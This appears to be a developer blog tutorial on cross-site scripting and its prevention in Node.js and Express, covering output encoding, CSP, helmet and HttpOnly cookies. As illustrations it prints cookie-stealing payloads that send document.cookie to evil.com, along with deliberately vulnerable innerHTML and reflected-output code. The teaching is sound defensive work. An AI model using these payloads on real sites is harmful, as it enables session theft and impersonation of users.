---
title: "XSS Protection: Stopping Scripts from Stealing Your Users"
date: "2026-04-17"
tags: ["backend", "xss", "security", "frontend", "Node.js", "Express"]
excerpt: "Learn how Cross-Site Scripting attacks inject malicious code into your app, steal user data, and how to prevent them with escaping, CSP, and sanitization."
---

# XSS Protection: Stopping Scripts from Stealing Your Users

Someone types `<script>stealCookies()</script>` into your comment box. You save it to the database. Now every user who views that comment runs the script. That's XSS.

## What is XSS?

**XSS** stands for **Cross-Site Scripting**. It's an attack where malicious scripts are injected into a trusted website and executed in other users' browsers.

Unlike CSRF (which tricks the browser into sending requests), XSS actually **runs code** in the victim's browser. The script runs with the same permissions as the legitimate website — it can access cookies, localStorage, DOM elements, and make API calls on behalf of the user.

## Why Does It Matter?

❌ **Problem:** A forum allows users to post comments. No input sanitization. An attacker posts:

```text
Great article!
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

Every user who views this comment sends their session cookie to the attacker. The attacker can now impersonate any user who loaded the page.

XSS can also:
- **Redirect users** to phishing pages
- **Modify page content** (change payment addresses)
- **Log keystrokes** (capture passwords)
- **Spread like a worm** (Samy worm infected 1M+ MySpace profiles in 24 hours)

✅ **Solution:** Proper output encoding, input validation, Content Security Policy, and modern framework protections make XSS preventable. But you have to be consistent — one unescaped output is all it takes.

## Types of XSS

### 1. Stored XSS (Persistent)

The most dangerous. Malicious script is **stored** on the server (database, file, log) and served to every user who views the page.

```text
Attack flow:
1. Attacker submits <script>alert(document.cookie)</script> in a comment
2. Server saves it to the database WITHOUT sanitizing
3. User loads the page with comments
4. Server renders the comment — script executes in user's browser
5. User's cookies/data are stolen
```

**Targets:** Comment sections, user profiles, forum posts, chat messages, admin logs.

### 2. Reflected XSS (Non-Persistent)

The script is embedded in a **URL** and reflected back in the server's response. The victim must click a crafted link.

```text
// Malicious URL sent via email
https://myapp.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

// Server reflects the query parameter back without encoding
<h1>Search results for: <script>...</script></h1>
```

**Targets:** Search pages, error messages, URL parameters displayed in the UI.

### 3. DOM-Based XSS

The vulnerability exists entirely in the **client-side JavaScript**. The server never sees the malicious payload — the script manipulates the DOM directly.

```text
// Vulnerable frontend code
const hash = window.location.hash.substring(1);
document.getElementById("output").innerHTML = hash;

// Attacker crafts URL
https://myapp.com/page#<img src=x onerror="alert(document.cookie)">
```

**Targets:** Single-page applications, hash-based routing, URL fragment handling.

## How to Prevent XSS

### 1. Output Encoding (Escaping)

**The #1 defense.** Never insert untrusted data into HTML without encoding special characters.

```text
Characters to escape:
  &  →  &amp;
  <  →  &lt;
  >  →  &gt;
  "  →  &quot;
  '  →  &#x27;
```

```text
❌ Dangerous — renders raw HTML
element.innerHTML = userInput;

✅ Safe — escapes HTML entities
element.textContent = userInput;
```

Most modern frameworks escape by default:
- **React:** `{userInput}` auto-escapes. Only `{dangerouslySetInnerHTML}` is dangerous.
- **Vue:** `{{ userInput }}` auto-escapes. Only `v-html` is dangerous.
- **Angular:** `{{ userInput }}` auto-escapes. Only `innerHTML` binding is dangerous.

### 2. Content Security Policy (CSP)

Tell the browser which scripts are allowed to run. Even if an attacker injects a `<script>` tag, the browser refuses to execute it.

```text
// Express — set CSP header
app.use((req, res, next) => {
  res.setHeader(
    "Content-Security-Policy",
    "default-src 'self'; " +              // Only load from same origin
    "script-src 'self'; " +                // No inline scripts
    "style-src 'self' 'unsafe-inline'; " + // Allow inline styles
    "img-src 'self' data:; " +             // Images from self + data URIs
    "connect-src 'self'"                   // AJAX only to same origin
  );
  next();
});
```

With `script-src 'self'`, the browser will:
- ✅ Allow scripts loaded from your domain
- ❌ Block inline `<script>` tags
- ❌ Block scripts from `evil.com`
- ❌ Block `eval()` calls

```text
// Using the helmet package (recommended)
npm install helmet

const helmet = require("helmet");
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:"],
    connectSrc: ["'self'"]
  }
}));
```

### 3. Input Validation and Sanitization

Validate and sanitize all user input **on the server**. Never trust what comes from the browser.

```text
// Remove HTML tags from input
const sanitizeHtml = require("sanitize-html");

const cleanInput = sanitizeHtml(userInput, {
  allowedTags: [],        // Strip all HTML tags
  allowedAttributes: {}   // Strip all attributes
});
```

### 4. Use HTTP-Only Cookies

Prevent JavaScript from accessing session cookies — even if XSS executes, the attacker can't steal cookies.

```text
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

With `HttpOnly`, `document.cookie` returns an empty string for that cookie.

### 5. Use Modern Frameworks

React, Vue, and Angular auto-escape by default. The dangerous methods are opt-in:

| Framework | Safe (auto-escaped) | Dangerous (raw HTML) |
|---|---|---|
| React | `{userInput}` | `dangerouslySetInnerHTML` |
| Vue | `{{ userInput }}` | `v-html` |
| Angular | `{{ userInput }}` | `[innerHTML]` |

Only use the dangerous methods with **sanitized** content.

### 6. Set Security Headers

```text
// Using helmet — sets multiple security headers at once
const helmet = require("helmet");
app.use(helmet());

// Headers set by helmet:
X-Content-Type-Options: nosniff           // Prevent MIME-type sniffing
X-Frame-Options: DENY                     // Prevent clickjacking
X-XSS-Protection: 0                       // Disable buggy browser XSS filter
Content-Security-Policy: default-src 'self'
Strict-Transport-Security: max-age=...    // Force HTTPS
```

## XSS in Different Contexts

Escaping rules depend on **where** the data is inserted:

| Context | Example | Required Escaping |
|---|---|---|
| HTML body | `<div>USER_INPUT</div>` | HTML entity encoding |
| HTML attribute | `<input value="USER_INPUT">` | Attribute encoding |
| JavaScript | `<script>var x = "USER_INPUT"</script>` | JavaScript encoding |
| URL | `<a href="USER_INPUT">` | URL encoding |
| CSS | `<div style="USER_INPUT">` | CSS encoding |

Each context has different special characters. Using the wrong escaping method = still vulnerable.

## Common XSS Mistakes

### ❌ Using `innerHTML` with User Input

```text
// NEVER do this
document.getElementById("output").innerHTML = userInput;
```

### ❌ Trusting URL Parameters

```text
// Vulnerable — reflected XSS
res.send(`<h1>Search: ${req.query.q}</h1>`);

// Safe — escaped
res.send(`<h1>Search: ${escapeHtml(req.query.q)}</h1>`);
```

### ❌ Sanitizing Only on the Frontend

Frontend validation is easily bypassed (curl, Postman). Always sanitize on the **server**.

### ❌ Allowing All HTML in Rich Text Editors

If users need formatted text, use a allowlist of safe tags — not a blocklist of dangerous ones.

```text
// Good — allowlist approach
const clean = sanitizeHtml(userInput, {
  allowedTags: ["b", "i", "em", "strong", "p", "br"],
  allowedAttributes: {}
});
```

## Key Points Cheat Sheet

| Concept | What It Does |
|---|---|
| **XSS** | Injecting malicious scripts into a trusted website |
| **Stored XSS** | Script saved in DB — runs for every viewer |
| **Reflected XSS** | Script in URL — runs when victim clicks link |
| **DOM-based XSS** | Script manipulates DOM entirely client-side |
| **Output encoding** | Escape HTML entities — #1 defense |
| **CSP** | Browser blocks unauthorized scripts from running |
| **HttpOnly cookies** | JavaScript can't read cookies — limits XSS damage |
| **Helmet** | Express middleware for security headers |
| **Modern frameworks** | Auto-escape by default — use safe APIs |
| **Sanitization** | Strip dangerous HTML from user input |

**One unescaped `innerHTML` is all it takes. Consistency in output encoding is your strongest defense.**
